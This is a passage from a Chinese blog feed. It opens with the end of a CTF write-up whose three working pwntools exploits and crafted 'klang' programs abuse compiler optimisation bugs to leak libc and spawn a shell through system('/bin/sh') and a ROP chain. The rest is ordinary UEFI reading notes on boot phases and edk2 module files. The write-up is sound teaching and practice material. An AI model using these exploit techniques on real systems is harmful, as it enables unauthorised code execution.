class="hljs-string">&#x27;./libc-2.31.so&#x27;</span>)<br>p.recvline()<br>libcbase=<span class="hljs-built_in">int</span>(p.recvline()[:-<span class="hljs-number">1</span>].decode())-<span class="hljs-number">0xe2d9b</span><br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(libcbase))<br>p.sendline(<span class="hljs-string">b&#x27;1&#x27;</span>)<br>p.sendline(<span class="hljs-built_in">str</span>(<span class="hljs-number">0x4006a0</span>).encode())<br>p.sendline(<span class="hljs-string">b&#x27;1&#x27;</span>)<br>p.sendline(<span class="hljs-built_in">str</span>(libcbase+libc.symbols[<span class="hljs-string">&#x27;system&#x27;</span>]).encode())<br>p.sendline(<span class="hljs-string">b&#x27;1&#x27;</span>)<br>p.sendline(<span class="hljs-string">b&#x27;0&#x27;</span>)<br>p.interactive()<br></code></pre></td></tr></table></figure></li><li><p>exp.klang</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><code class="hljs c">function <span class="hljs-title function_">main</span><span class="hljs-params">()</span> : <span class="hljs-type">int</span> libcbase -&gt; <span class="hljs-type">int</span><br>&#123;<br>leak_libc(<span class="hljs-number">123123</span>, <span class="hljs-number">23333</span>);<br>hack();<br>prints(<span class="hljs-string">&quot;/bin/sh&quot;</span>);<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br>function <span class="hljs-title function_">leak_libc</span><span class="hljs-params">(<span class="hljs-type">int</span> a, <span class="hljs-type">int</span> b)</span> :  <span class="hljs-type">int</span> c, <span class="hljs-type">int</span> d-&gt; <span class="hljs-type">int</span><br>&#123;<br>c := a + <span class="hljs-number">1</span>;<br>printi(c);<br><span class="hljs-keyword">if</span> (b &gt; <span class="hljs-number">100</span>)<br>&#123;<br>d := a + <span class="hljs-number">1</span>;<br>&#125;;<br><span class="hljs-keyword">return</span> d;<br>&#125;<br><br>function <span class="hljs-title function_">hack</span><span class="hljs-params">()</span> : <span class="hljs-built_in">array</span> a, <span class="hljs-built_in">array</span> b, <span class="hljs-built_in">array</span> c, <span class="hljs-built_in">array</span> d, <span class="hljs-built_in">array</span> e, <span class="hljs-built_in">array</span> f, <span class="hljs-type">int</span> g -&gt; <span class="hljs-type">int</span><br>&#123;<br>a := array_new(<span class="hljs-number">1</span>);<br>b := array_new(<span class="hljs-number">2</span>);<br>c := array_new(<span class="hljs-number">3</span>);<br>d := array_new(<span class="hljs-number">4</span>);<br>e := array_new(<span class="hljs-number">5</span>);<br>f := array_new(<span class="hljs-number">7</span>);<br><span class="hljs-keyword">do</span><br>&#123;<br>f[<span class="hljs-number">0</span>] := inputi();<br>g := inputi();<br>a[<span class="hljs-number">0</span>] := <span class="hljs-number">1</span>;<br>b[<span class="hljs-number">0</span>] := <span class="hljs-number">2</span>;<br>c[<span class="hljs-number">0</span>] := <span class="hljs-number">3</span>;<br>d[<span class="hljs-number">0</span>] := <span class="hljs-number">4</span>;<br>e[<span class="hljs-number">0</span>] := <span class="hljs-number">5</span>;<br>&#125;<br><span class="hljs-keyword">while</span>(inputi());<br>dup(g);<br>dup(f[<span class="hljs-number">0</span>]);<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br>function <span class="hljs-title function_">dup</span><span class="hljs-params">(<span class="hljs-type">int</span> a)</span> : -&gt; <span class="hljs-type">int</span><br>&#123;<br><span class="hljs-keyword">return</span> a * a;<br>&#125;<br></code></pre></td></tr></table></figure></li></ul><h2 id="exp2"><a href="#exp2" class="headerlink" title="exp2"></a>exp2</h2><p>GlobalCSE未初始化泄漏libc + DCE任意写</p><ul><li><p>exp.py</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context.log_level=<span class="hljs-string">&#x27;debug&#x27;</span><br>context.os=<span class="hljs-string">&#x27;linux&#x27;</span><br>context.arch=<span class="hljs-string">&#x27;amd64&#x27;</span><br><br><span class="hljs-comment">#p=process(&#x27;./test&#x27;)</span><br>p=remote(<span class="hljs-string">&#x27;127.0.0.1&#x27;</span>,<span class="hljs-number">9999</span>)<br><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;exp.klang&#x27;</span>,<span class="hljs-string">&#x27;r&#x27;</span>) <span class="hljs-keyword">as</span> file:<br>    content=file.read()<br><br>p.sendlineafter(<span class="hljs-string">b&#x27;Give me your code, ended by a line with \&#x27;END_OF_SNIPPET\&#x27; (excluding quote).&#x27;</span>,content.encode())<br>p.sendline(<span class="hljs-string">b&#x27;END_OF_SNIPPET&#x27;</span>)<br>libc=ELF(<span class="hljs-string">&#x27;./libc-2.31.so&#x27;</span>)<br>p.recvline()<br>libcbase=<span class="hljs-built_in">int</span>(p.recvline()[:-<span class="hljs-number">1</span>].decode())-<span class="hljs-number">0xe2d9b</span><br>p.sendline(<span class="hljs-built_in">str</span>(<span class="hljs-number">0x4006a0</span>).encode())<br>p.sendline(<span class="hljs-built_in">str</span>(libcbase+libc.symbols[<span class="hljs-string">&#x27;system&#x27;</span>]).encode())<br>p.interactive()<br></code></pre></td></tr></table></figure></li><li><p>exp.klang</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs c">function <span class="hljs-title function_">main</span><span class="hljs-params">()</span> : <span class="hljs-type">int</span> a -&gt; <span class="hljs-type">int</span><br>&#123;<br>leak_libc(<span class="hljs-number">123</span>, <span class="hljs-number">456</span>);<br>write();<br>prints(<span class="hljs-string">&quot;/bin/sh&quot;</span>);<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br>function <span class="hljs-title function_">write</span><span class="hljs-params">()</span> : <span class="hljs-type">int</span> a -&gt; <span class="hljs-type">void</span><br>&#123;<br>a := inputi();<br>write_();<br><span class="hljs-keyword">return</span>;<br>&#125;<br><br>function <span class="hljs-title function_">write_</span><span class="hljs-params">()</span> : <span class="hljs-built_in">array</span> c -&gt; <span class="hljs-type">void</span><br>&#123;<br>c[<span class="hljs-number">0</span>] := inputi();<br>c := array_new(<span class="hljs-number">1</span>);<br><span class="hljs-keyword">return</span>;<br>&#125;<br><br>function <span class="hljs-title function_">leak_libc</span><span class="hljs-params">(<span class="hljs-type">int</span> a, <span class="hljs-type">int</span> b)</span> :  <span class="hljs-type">int</span> c, <span class="hljs-type">int</span> d-&gt; <span class="hljs-type">int</span><br>&#123;<br>c := a + <span class="hljs-number">1</span>;<br>printi(c);<br><span class="hljs-keyword">if</span> (b &gt; <span class="hljs-number">100</span>)<br>&#123;<br>d := a + <span class="hljs-number">1</span>;<br>&#125;;<br><span class="hljs-keyword">return</span> d;<br>&#125;<br></code></pre></td></tr></table></figure></li></ul><h2 id="exp3"><a href="#exp3" class="headerlink" title="exp3"></a>exp3</h2><p>GlobalCSE未初始化泄漏libc + WHILE中ret</p><ul><li><p>exp.py</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context.log_level=<span class="hljs-string">&#x27;debug&#x27;</span><br>context.os=<span class="hljs-string">&#x27;linux&#x27;</span><br>context.arch=<span class="hljs-string">&#x27;amd64&#x27;</span><br><br><span class="hljs-comment">#p=process(&#x27;./test&#x27;)</span><br>p=remote(<span class="hljs-string">&#x27;127.0.0.1&#x27;</span>,<span class="hljs-number">9999</span>)<br><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;exp.klang&#x27;</span>,<span class="hljs-string">&#x27;r&#x27;</span>) <span class="hljs-keyword">as</span> file:<br>    content=file.read()<br><br>p.sendlineafter(<span class="hljs-string">b&#x27;Give me your code, ended by a line with \&#x27;END_OF_SNIPPET\&#x27; (excluding quote).&#x27;</span>,content.encode())<br>p.sendline(<span class="hljs-string">b&#x27;END_OF_SNIPPET&#x27;</span>)<br>libc=ELF(<span class="hljs-string">&#x27;./libc-2.31.so&#x27;</span>)<br>rdi=<span class="hljs-number">0x4018c3</span><br>ret=<span class="hljs-number">0x40101a</span><br>binsh=<span class="hljs-number">0x404098</span><br>p.recvline()<br>libcbase=<span class="hljs-built_in">int</span>(p.recvline()[:-<span class="hljs-number">1</span>].decode())-<span class="hljs-number">0xe2d9b</span><br>p.sendline(<span class="hljs-built_in">str</span>(rdi).encode())<br>p.sendline(<span class="hljs-built_in">str</span>(binsh).encode())<br>p.sendline(<span class="hljs-built_in">str</span>(libcbase+libc.symbols[<span class="hljs-string">&#x27;system&#x27;</span>]).encode())<br>p.sendline(<span class="hljs-string">b&#x27;1&#x27;</span>)<br>p.interactive()<br></code></pre></td></tr></table></figure></li><li><p>exp.klang</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><code class="hljs c">function <span class="hljs-title function_">main</span><span class="hljs-params">()</span> : <span class="hljs-type">int</span> a, <span class="hljs-type">int</span> b, <span class="hljs-type">int</span> c, <span class="hljs-type">int</span> d -&gt; <span class="hljs-type">int</span><br>&#123;<br>leak_libc(<span class="hljs-number">123</span>, <span class="hljs-number">456</span>);<br>a := inputi();<br>b := inputi();<br>c := inputi();<br>d := inputi();<br>prints(<span class="hljs-string">&quot;/bin/sh&quot;</span>);<br><span class="hljs-keyword">do</span><br>&#123;<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><span class="hljs-keyword">while</span>(inputi());<br>a := dup(a);<br>b := dup(b);<br>c := dup(c);<br>d := dup(d);<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br>function <span class="hljs-title function_">leak_libc</span><span class="hljs-params">(<span class="hljs-type">int</span> a, <span class="hljs-type">int</span> b)</span> :  <span class="hljs-type">int</span> c, <span class="hljs-type">int</span> d-&gt; <span class="hljs-type">int</span><br>&#123;<br>c := a + <span class="hljs-number">1</span>;<br>printi(c);<br><span class="hljs-keyword">if</span> (b &gt; <span class="hljs-number">100</span>)<br>&#123;<br>d := a + <span class="hljs-number">1</span>;<br>&#125;;<br><span class="hljs-keyword">return</span> d;<br>&#125;<br><br>function <span class="hljs-title function_">dup</span><span class="hljs-params">(<span class="hljs-type">int</span> a)</span> : -&gt; <span class="hljs-type">int</span><br>&#123;<br><span class="hljs-keyword">return</span> a * a;<br>&#125;<br></code></pre></td></tr></table></figure></li></ul>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
      <category>WP</category>
      
    </categories>
    
    
    <tags>
      
      <tag>wp</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>《UEFI原理与编程》读书笔记</title>
    <link href="/2024/03/27/UEFI%E5%8E%9F%E7%90%86%E4%B8%8E%E7%BC%96%E7%A8%8B%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/"/>
    <url>/2024/03/27/UEFI%E5%8E%9F%E7%90%86%E4%B8%8E%E7%BC%96%E7%A8%8B%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/</url>
    
    <content type="html"><![CDATA[<p>wjy又双叒叕开始走支线了……经典学新东西一本书起步</p><span id="more"></span><h1 id="UEFI概述"><a href="#UEFI概述" class="headerlink" title="UEFI概述"></a>UEFI概述</h1><h2 id="UEFI系统组成"><a href="#UEFI系统组成" class="headerlink" title="UEFI系统组成"></a>UEFI系统组成</h2><img src="/2024/03/27/UEFI%E5%8E%9F%E7%90%86%E4%B8%8E%E7%BC%96%E7%A8%8B%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/%E7%B3%BB%E7%BB%9F%E7%BB%84%E6%88%90.png" class title="系统组成"><ul><li>TSL阶段BS提供的服务：<ul><li>事件服务</li><li>内存管理</li><li>Protocol管理</li><li>Protocol使用类服务</li><li>驱动管理</li><li>Image管理</li><li>ExitBootService</li></ul></li><li>RT提供的服务：<ul><li>时间服务</li><li>读写UEFI系统变量</li><li>虚拟内存服务</li><li>其他服务，如重启系统的ResetSystem</li></ul></li></ul><h2 id="UEFI启动过程"><a href="#UEFI启动过程" class="headerlink" title="UEFI启动过程"></a>UEFI启动过程</h2><img src="/2024/03/27/UEFI%E5%8E%9F%E7%90%86%E4%B8%8E%E7%BC%96%E7%A8%8B%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/uefi7.png" class title="uefi7"><h3 id="SEC"><a href="#SEC" class="headerlink" title="SEC"></a>SEC</h3><h4 id="SEC阶段功能"><a href="#SEC阶段功能" class="headerlink" title="SEC阶段功能"></a>SEC阶段功能</h4><ul><li>接受并处理系统启动和重启信号</li><li>初始化临时存储区域</li><li>作为可信系统的根</li><li>传递系统参数给下一阶段PEI<ul><li>系统当前状态</li><li>BFM的地址和大小</li><li>临时RAM的地址和大小</li><li>栈的地址和大小</li></ul></li></ul><h4 id="SEC执行流程"><a href="#SEC执行流程" class="headerlink" title="SEC执行流程"></a>SEC执行流程</h4><img src="/2024/03/27/UEFI%E5%8E%9F%E7%90%86%E4%B8%8E%E7%BC%96%E7%A8%8B%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/sec.png" class title="sec"><p>以初始化临时RAM为界，SEC分为两部分：</p><ul><li>Reset Vector</li><li>SEC功能区</li></ul><p>Reset Vector执行流程：</p><ul><li>进入固件入口</li><li>从实模式转32位平坦模式</li><li>定位固件中的BFV</li><li>定位固件中的SEC映像</li><li>若是64位系统，从32位模式转换到64位模式</li><li>调用SEC入口函数</li></ul><h3 id="PEI"><a href="#PEI" class="headerlink" title="PEI"></a>PEI</h3><p>主要功能是为DXE准备执行环境，将需要传递到DXE的信息组成HOB列表</p><p>从功能上讲PEI分为两部分：</p><ul><li>PEI内核：负责PEI基础服务和执行流程</li><li>PEIM派遣器：找出系统中所有PEIM，根据依赖关系顺序执行</li></ul><img src="/2024/03/27/UEFI%E5%8E%9F%E7%90%86%E4%B8%8E%E7%BC%96%E7%A8%8B%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/pei.png" class title="pei"><p>PEIM之间通过PPI通信，可通过GUID定位</p><h3 id="DXE"><a href="#DXE" class="headerlink" title="DXE"></a>DXE</h3><p>从功能上讲DXE分为两部分：</p><ul><li>DXE内核：负责DXE基础服务和执行流程</li><li>DXE派遣器：负责调度执行DXE驱动，初始化系统设备</li></ul><img src="/2024/03/27/UEFI%E5%8E%9F%E7%90%86%E4%B8%8E%E7%BC%96%E7%A8%8B%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/dxe.png" class title="dxe"><p>DXE之间通过Protocol通信，可通过GUID定位</p><h3 id="BDS"><a href="#BDS" class="headerlink" title="BDS"></a>BDS</h3><p>主要功能是执行启动策略，包括：</p><ul><li>初始化控制台设备</li><li>加载必要的设备驱动</li><li>根据系统设置加载和执行启动项</li></ul><p>加载启动项失败，系统将重新执行DXE dispatcher以加载更多的驱动，然后重新尝试加载启动项</p><h3 id="TSL"><a href="#TSL" class="headerlink" title="TSL"></a>TSL</h3><p>OS Loader执行的第一个阶段</p><ul><li>OS Loader作为一个UEFI应用程序运行，系统资源仍然由UEFI内核控制</li><li>ExitBootServices服务被调用后，系统进入RT阶段</li></ul><p>TSL是一个临时系统，UEFI Shell是这个临时系统的人机交互界面</p><h3 id="RT"><a href="#RT" class="headerlink" title="RT"></a>RT</h3><ul><li>系统控制权和资源由UEFI内核转交到OS Loader手中</li><li>运行时服务保留给OS和OS Loader使用</li><li>最终OS取得系统的控制权</li></ul><h3 id="AL"><a href="#AL" class="headerlink" title="AL"></a>AL</h3><p>RT阶段错误处理，未定义</p><h1 id="UEFI工程模块文件"><a href="#UEFI工程模块文件" class="headerlink" title="UEFI工程模块文件"></a>UEFI工程模块文件</h1><p>各UEFI工程文件之间的关系</p><p>*Pkg：包</p><ul><li>.dsc：平台描述文件</li><li>.dec：包申明文件</li><li>模块（编译完就是.efi）<ul><li>.inf：元数据文件</li><li>源文件</li></ul></li></ul><table><thead><tr><th align="left">模块类型</th><th align="left">说明</th></tr></thead><tbody><tr><td align="left">标准应用程序工程模块</td><td align="left">在DXE阶段运行的应用程序（Shell环境下也可以运行）</td></tr><tr><td align="left">ShellAppMain应用程序工程模块</td><td align="left">Shell环境下运行的应用程序</td></tr><tr><td align="left">UEFI驱动模块</td><td align="left">符合UEFI驱动模型的驱动，仅在BS期间有效</td></tr><tr><td align="left">库模块</td><td align="left">作为静态库被其他模块调用</td></tr><tr><td align="left">DXE驱动模块</td><td align="left">DXE环境下运行的驱动，此类驱动不遵循UEFI驱动模型</td></tr><tr><td align="left">DXE运行时驱动模型</td><td align="left">进入RT依然有效的驱动</td></tr><tr><td align="left">DXE SAL驱动模块</td><td align="left">仅对安腾CPU有效的一种驱动</td></tr><tr><td align="left">DXE SMM驱动模块</td><td align="left">系统管理模式驱动，模块被加载到系统管理内存区，系统进入RT仍然有效</td></tr><tr><td align="left">PEIM模块</td><td align="left">PEI阶段的模块</td></tr><tr><td align="left">SEC模块</td><td align="left">固件的SEC阶段</td></tr><tr><td align="left">PEI_CORE模块</td><td align="left">固件的PEI阶段</td></tr><tr><td align="left">DXE_CORE模块</td><td align="left">固件的DXE模块</td></tr></tbody></table><h2 id="工程文件"><a href="#工程文件" class="headerlink" title="工程文件"></a>工程文件</h2><p>edk2文件与edk2工具链命令之间的关系：</p><img src="/2024/03/27/UEFI%E5%8E%9F%E7%90%86%E4%B8%8E%E7%BC%96%E7%A8%8B%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/file.png" class title="file"><h3 id="inf"><a href="#inf" class="headerlink" title=".inf"></a>.inf</h3><ul><li>作用相当于Makefile</li><li>分很多个块，以”[块名]\n”开头</li></ul><table><thead><tr><th>必需块</th><th>块描述</th></tr></thead><tbody><tr><td>[Defines]</td><td>定义本模块的属性变量及其他变量，这些变量可在工程文件其他块中使用</td></tr><tr><td>[Sources]</td><td>列出本模块所有源文件及资源文件</td></tr><tr><td>[Packages]</td><td>列出本模块引用到的所有包的包声明文件，可能引用到的资源包括头文件、GUID、Protocol等，这些资源都声明在包的包声明文件.dec中</td></tr><tr><td>[LibraryClasses]</td><td>列出本模块要链接的库模块</td></tr></tbody></table><table><thead><tr><th>非必需块</th><th>块描述</th></tr></thead><tbody><tr><td>[Protocols]</td><td>列出本模块用到的Protocol</td></tr><tr><td>[Guids]</td><td>列出本模块用到的GUID</td></tr><tr><td>[BuildOptions]</td><td>指定编译和链接选项</td></tr><tr><td>[Pcd]</td><td>平台配置数据库，用于列出本模块用到的Pcd变量，这些Pcd变量可被整个UEFI系统访问</td></tr><tr><td>[PcdEx]</td><td>用于列出本模块用到的Pcd变量，这些Pcd变量可被整个UEFI系统访问</td></tr><tr><td>[FixedPcd]</td><td>用于列出本模块用到的Pcd编译期常量</td></tr><tr><td>[FeaturePcd]</td><td>用于列出本模块用到的Pcd常量</td></tr><tr><td>[PatchPcd]</td><td>列出的Pcd变量仅本模块可用</td></tr></tbody></table><h3 id="dsc"><a href="#dsc" class="headerlink" title=".dsc"></a>.dsc</h3><p>用于编译一个Package，分为好几个块：</p><ul><li><p>[Define]</p><ul><li><p>用于设置build相关的全局宏变量，可被.dsc其他块使用</p></li><li><p>通过DEFINE和EDK_GLOBAL定义的宏可以在.dsc和.fdf中通过$+宏变量名使用</p></li><li><p>必须定义的宏变量</p><img src="/2024/03/27/UEFI%E5%8E%9F%E7%90%86%E4%B8%8E%E7%BC%96%E7%A8%8B%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/must.png" class title="must"></li><li><p>可选宏变量</p><img src="/2024/03/27/UEFI%E5%8E%9F%E7%90%86%E4%B8%8E%E7%BC%96%E7%A8%8B%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/need1.png" class title="need1"><img src="/2024/03/27/UEFI%E5%8E%9F%E7%90%86%E4%B8%8E%E7%BC%96%E7%A8%8B%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/need2.png" class title="need2"></li></ul></li><li><p>[LibraryClasses]</p><ul><li>定义了模块的名字和模块.inf文件的路径</li></ul></li><li><p>[Components]</p><ul><li>该区域内定义的模块都会被build工具编译生成.efi文件</li></ul></li><li><p>[BuildOptions]</p><ul><li>编译和链接选项</li></ul></li><li><p>[PCD]</p><ul><li>定义平台配置数据</li></ul></li></ul><h3 id="dec"><a href="#dec" class="headerlink" title=".dec"></a>.dec</h3><p>定义了公开的数据和的接口，供其他模块使用</p><ul><li>[Defines]<ul><li>用于提供package的名称，GUID，版本号等信息</li></ul></li><li>[Includes]<ul><li>列出本package提供的头文件所在目录</li></ul></li><li>[LibraryClasses]<ul><li>对外提供库，每个库都必须包含一个头文件</li></ul></li><li>[Guids]<ul><li>各个.inf文件中的GUID的常量定义</li></ul></li><li>[Protocols]<ul><li>Protocol的GUID值的定义</li></ul></li><li>[Ppis]<ul><li>源文件中用到的PPI的GUID值的定义</li></ul></li><li>[PCD]<ul><li>.dsc文件中[PCD]块的补充</li></ul></li></ul><h2 id="标准应用程序工程模块"><a href="#标准应用程序工程模块" class="headerlink" title="标准应用程序工程模块"></a>标准应用程序工程模块</h2><h3 id="入口函数"><a href="#入口函数" class="headerlink" title="入口函数"></a>入口函数</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;Uefi.h&gt;</span><span class="hljs-comment">// 包含基本数据类型和核心数据结构</span></span><br><br>EFI_STATUS<br>EFIAPI<br><span class="hljs-title function_">UefiMain</span> <span class="hljs-params">(<span class="hljs-comment">// UEFI标准应用程序通常的入口函数名，由.inf中的ENTRY_POINT定义</span></span><br><span class="hljs-params">  IN EFI_HANDLE        ImageHandle,</span><br><span class="hljs-params">  IN EFI_SYSTEM_TABLE  *SystemTable</span><br><span class="hljs-params">  )</span><br>&#123;<br>&#125;<br></code></pre></td></tr></table></figure><ul><li>返回类型EFI_STATUS<ul><li>本质无符号长整数</li><li>最高位1错误值，最高位0非错误值</li><li>EFI_SUCCESS&#x3D;0，表示没有错误的返回值</li></ul></li><li>参数<ul><li>ImageHandle：<ul><li>.efi加载到内存后生成的对象为Image</li><li>ImageHandle是Image的句柄</li></ul></li><li>SystemTable：<ul><li>获取UEFI的各种服务</li><li>全局结构体</li></ul></li></ul></li></ul><h2 id="Shell应用程序工程模块"><a href="#Shell应用程序工程模块" class="headerlink" title="Shell应用程序工程模块"></a>Shell应用程序工程模块</h2><h3 id="入口函数-1"><a href="#入口函数-1" class="headerlink" title="入口函数"></a>入口函数</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs c">INTN<br>EFIAPI<br><span class="hljs-title function_">ShellAppMain</span> <span class="hljs-params">(</span><br><span class="hljs-params">  IN UINTN   Argc,</span><br><span class="hljs-params">  IN CHAR16  **Argv</span><br><span class="hljs-params">  )</span><br>&#123;<br>&#125;<br></code></pre></td></tr></table></figure><p>没有SystemTable参数，通过全局变量gST使用系统表</p><h2 id="UEFI驱动模块"><a href="#UEFI驱动模块" class="headerlink" title="UEFI驱动模块"></a>UEFI驱动模块</h2><ul><li>驱动常驻内存</li><li>应用程序执行完毕后会从内存清楚</li></ul><h3 id="入口函数-2"><a href="#入口函数-2" class="headerlink" title="入口函数"></a>入口函数</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs c">EFI_STATUS<br>EFIAPI<br><span class="hljs-title function_">InitializePciSioSerial</span> <span class="hljs-params">(</span><br><span class="hljs-params">  IN EFI_HANDLE        ImageHandle,</span><br><span class="hljs-params">  IN EFI_SYSTEM_TABLE  *SystemTable</span><br><span class="hljs-params">  )</span><br>&#123;<br>&#125;<br></code></pre></td></tr></table></figure><h1 id="UEFI中的Protocol"><a href="#UEFI中的Protocol" class="headerlink" title="UEFI中的Protocol"></a>UEFI中的Protocol</h1><p>UEFI中的Protocol引入了面向对象的思想：</p><ul><li>用struct模拟class</li><li>用函数指针模拟成员函数<ul><li>这种函数的第一参数必须是指向Protocol的指针</li><li>用来模拟this指针</li></ul></li></ul><p>一个Protocol实例例子：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">// MdePkg\Include\Protocol\BlockIo.h</span><br><br><span class="hljs-class"><span class="hljs-keyword">struct</span> _<span class="hljs-title">EFI_BLOCK_IO_PROTOCOL</span> &#123;</span><br>  UINT64                Revision;<br>  EFI_BLOCK_IO_MEDIA    *Media;<br><br>  EFI_BLOCK_RESET       Reset;<br>  EFI_BLOCK_READ        ReadBlocks;<br>  EFI_BLOCK_WRITE       WriteBlocks;<br>  EFI_BLOCK_FLUSH       FlushBlocks;<br>&#125;;<br><br><span class="hljs-keyword">extern</span> EFI_GUID  gEfiBlockIoProtocolGuid;<br></code></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">// MdePkg\MdePkg.dec</span><br><br>  ## Include/Protocol/BlockIo.h<br>  gEfiBlockIoProtocolGuid        = &#123; <span class="hljs-number">0x964E5B21</span>, <span class="hljs-number">0x6459</span>, <span class="hljs-number">0x11D2</span>, &#123; <span class="hljs-number">0x8E</span>, <span class="hljs-number">0x39</span>, <span 